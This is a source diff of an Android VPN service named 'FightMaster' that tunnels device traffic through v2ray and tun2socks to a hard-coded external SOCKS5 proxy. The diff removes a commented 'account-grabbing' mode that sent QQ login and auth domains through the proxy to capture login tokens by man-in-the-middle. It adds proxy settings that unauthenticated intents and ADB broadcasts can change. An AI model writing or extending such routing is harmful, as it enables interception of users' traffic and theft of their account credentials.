@@ -9,30 +9,43 @@ import android.os.Build;
 import android.os.ParcelFileDescriptor;
 import android.util.Log;
 
+import org.json.JSONArray;
+import org.json.JSONException;
+import org.json.JSONObject;
+
 import java.nio.charset.StandardCharsets;
 
 import tun2socks.Tun2socks;
 
 /**
  * FightMaster VPN 服务
- * 硬编码 SOCKS5 代理配置，通过 tun2socks + v2ray-core 建立 VPN 隧道
+ * 通过 tun2socks + v2ray-core 建立 VPN 隧道
+ * 代理地址可通过 Intent extra 或 SharedPreferences 配置
  */
 public class FightMasterVpnService extends VpnService implements tun2socks.VpnService {
 
     private static final String TAG = "FightMasterVPN";
     private static final String CHANNEL_ID = "fightmaster_vpn";
 
-    // 代理服务器配置
-    public static final String PROXY_HOST = "38.22.234.228";
-    public static final int PROXY_PORT = 9900;
+    // ADB 广播 Action 常量
+    public static final String ACTION_START = "com.fightmaster.vpn.START";
+    public static final String ACTION_STOP = "STOP";
+    public static final String ACTION_STATUS = "com.fightmaster.vpn.STATUS";
+
+    // Intent extra keys
+    public static final String EXTRA_PROXY_HOST = "proxy_host";
+    public static final String EXTRA_PROXY_PORT = "proxy_port";
+
+    // 代理服务器默认配置
+    private static final String DEFAULT_PROXY_HOST = "38.22.234.228";
+    private static final int DEFAULT_PROXY_PORT = 9900;
+    private String proxyHost = DEFAULT_PROXY_HOST;
+    private int proxyPort = DEFAULT_PROXY_PORT;
 
     private ParcelFileDescriptor pfd;
     private Thread bgThread;
     private volatile boolean running = false;
     private int tunFd = -1;
-
-    // 抓号模式：QQ auth 域名走代理（MITM），其余 QQ 域名直连
-    private boolean captureMode = false;
 
     // 静态实例引用，供 CommandReceiver 调用
     private static FightMasterVpnService instance;
@@ -41,38 +54,74 @@ public class FightMasterVpnService extends VpnService implements tun2socks.VpnSe
         return instance;
     }
 
-    /**
-     * 动态构建 v2ray 配置
-     * 普通模式：所有 QQ/腾讯域名直连
-     * 抓号模式：QQ auth 域名走代理（MITM 捕获 token），其余 QQ 域名仍直连
-     */
     private String buildV2RayConfig() {
-        String qqRule;
-        if (captureMode) {
-            // 抓号模式：auth 域名先匹配走代理，其余 QQ 域名直连
-            qqRule = "{\"type\":\"field\",\"domain\":[\"full:ssl.ptlogin2.qq.com\",\"full:xui.ptlogin2.qq.com\",\"full:graph.qq.com\",\"full:auth.qq.com\"],\"outboundTag\":\"proxy\"},"
-                   + "{\"type\":\"field\",\"domain\":[\"domain:qq.com\",\"domain:tencent.com\",\"domain:wechat.com\",\"domain:weixin.qq.com\",\"domain:gtimg.cn\",\"domain:qpic.cn\",\"domain:idqqimg.com\",\"domain:qlogo.cn\",\"domain:myqcloud.com\"],\"outboundTag\":\"direct\"},";
-        } else {
-            // 普通模式：所有 QQ/腾讯域名直连
-            qqRule = "{\"type\":\"field\",\"domain\":[\"domain:qq.com\",\"domain:tencent.com\",\"domain:wechat.com\",\"domain:weixin.qq.com\",\"domain:gtimg.cn\",\"domain:qpic.cn\",\"domain:idqqimg.com\",\"domain:qlogo.cn\",\"domain:myqcloud.com\"],\"outboundTag\":\"direct\"},";
-        }
+        try {
+            JSONObject config = new JSONObject();
 
-        return "{"
-            + "\"log\":{\"loglevel\":\"warning\"},"
-            + "\"dns\":{\"hosts\":{\"gameproxy-verify\":\"1.2.3.4\"},\"servers\":[\"223.5.5.5\",\"8.8.8.8\"]},"
-            + "\"outbound\":{\"protocol\":\"socks\",\"settings\":{\"servers\":[{\"address\":\"" + PROXY_HOST + "\",\"port\":" + PROXY_PORT + "}]},\"streamSettings\":{\"network\":\"tcp\"},\"tag\":\"proxy\"},"
-            + "\"outboundDetour\":["
-            +   "{\"protocol\":\"freedom\",\"settings\":{},\"tag\":\"direct\"},"
-            +   "{\"protocol\":\"dns\",\"settings\":{},\"tag\":\"dns-out\"}"
-            + "],"
-            + "\"routing\":{\"settings\":{\"domainStrategy\":\"IPOnDemand\",\"rules\":["
-            +   "{\"type\":\"field\",\"port\":\"53\",\"outboundTag\":\"dns-out\"},"
-            +   qqRule
-            +   "{\"type\":\"field\",\"ip\":[\"120.204.207.84\",\"101.226.94.67\",\"101.226.96.203\",\"116.128.169.94\",\"58.246.163.95\",\"221.181.98.213\",\"183.192.196.121\",\"116.128.169.68\",\"101.226.101.163\"],\"outboundTag\":\"direct\"},"
-            +   "{\"type\":\"field\",\"domain\":[\"domain:googleapis.com\",\"domain:google.com\",\"domain:gstatic.com\"],\"outboundTag\":\"direct\"},"
-            +   "{\"type\":\"field\",\"outboundTag\":\"proxy\",\"port\":\"0-65535\"}"
-            + "]}}"
-            + "}";
+            // log
+            config.put("log", new JSONObject().put("loglevel", "warning"));
+
+            // dns
+            JSONObject dns = new JSONObject();
+            dns.put("hosts", new JSONObject().put("gameproxy-verify", "1.2.3.4"));
+            dns.put("servers", new JSONArray().put("223.5.5.5").put("8.8.8.8"));
+            config.put("dns", dns);
+
+            // outbound (主代理)
+            JSONObject outbound = new JSONObject();
+            outbound.put("protocol", "socks");
+            outbound.put("settings", new JSONObject().put("servers",
+                new JSONArray().put(new JSONObject()
+                    .put("address", proxyHost)
+                    .put("port", proxyPort))));
+            outbound.put("streamSettings", new JSONObject().put("network", "tcp"));
+            outbound.put("tag", "proxy");
+            config.put("outbound", outbound);
+
+            // outboundDetour
+            JSONArray detour = new JSONArray();
+            detour.put(new JSONObject().put("protocol", "freedom").put("settings", new JSONObject()).put("tag", "direct"));
+            detour.put(new JSONObject().put("protocol", "dns").put("settings", new JSONObject()).put("tag", "dns-out"));
+            config.put("outboundDetour", detour);
+
+            // routing rules
+            JSONArray rules = new JSONArray();
+            rules.put(new JSONObject()
+                .put("type", "field").put("port", "53").put("outboundTag", "dns-out"));
+            rules.put(new JSONObject()
+                .put("type", "field")
+                .put("domain", new JSONArray()
+                    .put("domain:qq.com").put("domain:tencent.com")
+                    .put("domain:wechat.com").put("domain:weixin.qq.com")
+                    .put("domain:gtimg.cn").put("domain:qpic.cn")
+                    .put("domain:idqqimg.com").put("domain:qlogo.cn")
+                    .put("domain:myqcloud.com"))
+                .put("outboundTag", "direct"));
+            rules.put(new JSONObject()
+                .put("type", "field")
+                .put("ip", new JSONArray()
+                    .put("120.204.207.84").put("101.226.94.67").put("101.226.96.203")
+                    .put("116.128.169.94").put("58.246.163.95").put("221.181.98.213")
+                    .put("183.192.196.121").put("116.128.169.68").put("101.226.101.163"))
+                .put("outboundTag", "direct"));
+            rules.put(new JSONObject()
+                .put("type", "field")
+                .put("domain", new JSONArray()
+                    .put("domain:googleapis.com").put("domain:google.com").put("domain:gstatic.com"))
+                .put("outboundTag", "direct"));
+            rules.put(new JSONObject()
+                .put("type", "field").put("outboundTag", "proxy").put("port", "0-65535"));
+
+            config.put("routing", new JSONObject()
+                .put("settings", new JSONObject()
+                    .put("domainStrategy", "IPOnDemand")
+                    .put("rules", rules)));
+
+            return config.toString();
+        } catch (JSONException e) {
+            Log.e(TAG, "Failed to build v2ray config", e);
+            return "{}";
+        }
     }
 
     @Override
@@ -85,19 +134,24 @@ public class FightMasterVpnService extends VpnService implements tun2socks.VpnSe
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        if (intent != null && "STOP".equals(intent.getAction())) {
+        if (intent != null && ACTION_STOP.equals(intent.getAction())) {
             stopVpn();
             return START_NOT_STICKY;
         }
 
-        // 抓号模式切换（通过 Intent action）
-        if (intent != null && "CAPTURE_ON".equals(intent.getAction())) {
-            setCaptureMode(true);
-            return START_STICKY;
-        }
-        if (intent != null && "CAPTURE_OFF".equals(intent.getAction())) {
-            setCaptureMode(false);
-            return START_STICKY;
+        // 读取代理地址（优先 Intent extra，其次 SharedPreferences，最后默认值）
+        if (intent != null && intent.hasExtra(EXTRA_PROXY_HOST)) {
+            proxyHost = intent.getStringExtra(EXTRA_PROXY_HOST);
+            proxyPort = intent.getIntExtra(EXTRA_PROXY_PORT, DEFAULT_PROXY_PORT);
+            getSharedPreferences("fightmaster_config", MODE_PRIVATE)
+                .edit()
+                .putString("proxy_host", proxyHost)
+                .putInt("proxy_port", proxyPort)
+                .apply();
+        } else {
+            android.content.SharedPreferences prefs = getSharedPreferences("fightmaster_config", MODE_PRIVATE);
+            proxyHost = prefs.getString("proxy_host", DEFAULT_PROXY_HOST);
+            proxyPort = prefs.getInt("proxy_port", DEFAULT_PROXY_PORT);
         }
 
         if (running) {
@@ -170,7 +224,7 @@ public class FightMasterVpnService extends VpnService implements tun2socks.VpnSe
 
                 running = true;
                 Log.i(TAG, "VPN started successfully");
-                sendStatus("connected", PROXY_HOST + ":" + PROXY_PORT);
+                sendStatus("connected", proxyHost + ":" + proxyPort);
 
             } catch (Exception e) {
                 Log.e(TAG, "VPN start error", e);
@@ -253,17 +307,6 @@ public class FightMasterVpnService extends VpnService implements tun2socks.VpnSe
         super.onDestroy();
     }
 
-    /**
-     * 切换抓号模式。如果 VPN 正在运行，热重启 v2ray 使配置生效。
-     */
-    public void setCaptureMode(boolean enabled) {
-        this.captureMode = enabled;
-        Log.i(TAG, "Capture mode: " + (enabled ? "ON" : "OFF"));
-        // 不在运行时重启 VPN，仅设置标志位
-        // 下次 VPN 启动时会使用新配置
-        // 如果需要立即生效，外部应先 STOP 再 START
-    }
-
     private void sendStatus(String status, String detail) {
         Intent i = new Intent("com.fightmaster.vpn.VPN_STATUS");
         i.putExtra("status", status);
@@ -295,8 +338,7 @@ public class FightMasterVpnService extends VpnService implements tun2socks.VpnSe
     }
 
     public static boolean isRunning() {
-        // 简单标记，实际可用绑定方式
-        return false;
+        return instance != null && instance.running;
     }
 
     // 空实现的 DBService
